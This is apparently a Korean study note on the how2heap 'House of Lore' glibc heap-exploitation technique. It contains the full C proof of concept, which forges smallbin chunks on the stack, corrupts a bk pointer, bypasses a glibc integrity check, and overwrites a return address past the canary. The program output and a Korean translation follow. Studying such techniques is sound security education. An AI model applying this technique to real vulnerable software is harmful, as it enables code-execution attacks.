# How2Heap Study 07 House Of Lore

## Tech Overview

Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.

## Source

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

## Output

```
Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x15c9010
stack_buffer_1 at 0x7fffe454dc30
stack_buffer_2 at 0x7fffe454dc10
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack
Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()
Allocated the large chunk on the heap at 0x15c9080
Freeing the chunk 0x15c9010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x15c9010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x15c9470
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7fa67aff4bd8
victim->bk: 0x7fa67aff4bd8

Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fa67aff4bd8

p4 is 0x7fffe454dc40 and should be on the stack!
Nice jump d00d
```

## 개요 번역

Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.
smallbin 의 해제 목록을 어뷰징하여 임의에 가까운 포인터를 malloc 이 반환하도록 하는 트릭입니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
Welcome to the House of Lore
House of Lore 에 오신 것을 환영합니다.

This is a revisited version that bypass also the hardening check introduced by glibc malloc
다시 돌아온 이 버전은 glibc malloc 에 의해 소개된 더 강화된 검사 또한 우회합니다.

This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
이것은 우분투 14.04.4 - 32bit - glibc-2.23 를 배경으로 테스트 되었습니다.

Allocating the victim chunk
공격 대상 청크를 할당합니다.

Allocated the first small chunk on the heap at 0x15c9010
첫 번재 small 힙 청크를 할당하였고, 주소는 0x15c9010 입니다.

stack_buffer_1 at 0x7fffe454dc30
stack_buffer_2 at 0x7fffe454dc10

Create a fake chunk on the stack.
stack 에 가짜 청크를 만듭니다.

Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list.
smallbin 목록에 스택의 주소를 넣을 때 두 번째부터 마지막 malloc 까지 잘못 되었는지에 대한 검사를 우회하기 위해서 공격 대상 청크를 가리키도록 fwd 포인터를 설정합니다.

Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack.
스택에서 가짜 청크를 가리키는 포인터를 반환할 때 마지막 malloc 에서 small bin 가 잘못 되었는지에 대한 검사를 건너뛰기 위해 bk 포인터를 stack_buffer_2 를 가리키도록, stack_buffer_2 의 fwd 포인터를 stack_buffer_1 를 가리키도록 설정한다.

Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()
free() 를 하는 동안 small 청크 1 개와 top 청크를 통합하는 것을 방지하기 위해 다른 large 청크를 할당합니다.

Allocated the large chunk on the heap at 0x15c9080
large 힙 청크를 할당하였고, 주소는 0x15c9080 입니다.

Freeing the chunk 0x15c9010, it will be inserted in the unsorted bin
0x15c9010 청크를 해제하고, 이것은 unsorted bin 에 들어갈 것입니다.

In the unsorted bin the victim's fwd and bk pointers are nil
unsorted bin 안에서는 공격 대상의 fwd 와 bk 포인터는 nil(0x0) 입니다.

victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
이제 Unsorted bin 과 small bin 또한 상관할 수 없는 malloc 을 실행할 수 있습니다.

This means that the chunk 0x15c9010 will be inserted in front of the SmallBin
이 것은 0x15c9010 청크는 SmallBin 의 맨 앞에 추가가 될 것이라는 것을 의미합니다.

The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x15c9470
이 청크는 unsorted bin, SmallBin 또한 상관할 수 없으며, 할당된 주소는 0x15c9470 입니다.

The victim chunk has been sorted and its fwd and bk pointers updated
공격 대상 청크는 (bin 내에서 ―― 의역) 정렬이 되었고, fwd 와 bk 포인터가 갱신되었습니다.

victim->fwd: 0x7fa67aff4bd8
victim->bk: 0x7fa67aff4bd8

Now emulating a vulnerability that can overwrite the victim->bk pointer
공격 대상의 bk 포인터를 덮어쓸 수 있는 취약점을 시연해보겠습니다.

Now allocating a chunk with size equal to the first one freed
이제 첫 번째로 해제했던 청크와 같은 사이즈로 청크를 할당해보겠습니다.

This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
이 것은 덮어써진 공격 대상 청크를 반환할 것이고, bin->bk 에 victim->bk 포인터가 넣어진다.

This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
이 마지막 malloc 은 glibc malloc 이 공격된 bin->bk 안에 있는 청크를 반환하도록 하는 트릭이 실행된다.

p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fa67aff4bd8
stack_buffer_2 의 fwd 포인터는 마지막으로 malloc 을 호출한 이후 0x7fa67aff4bd8 로 변했습니다.

p4 is 0x7fffe454dc40 and should be on the stack!
p4 는 0x7fffe454dc40 에 있고 이 것은 스택에 있어야 한다.

Nice jump d00d
(취약점 공격에 성공하였다.) 어이, 좋은 점프인걸!
```
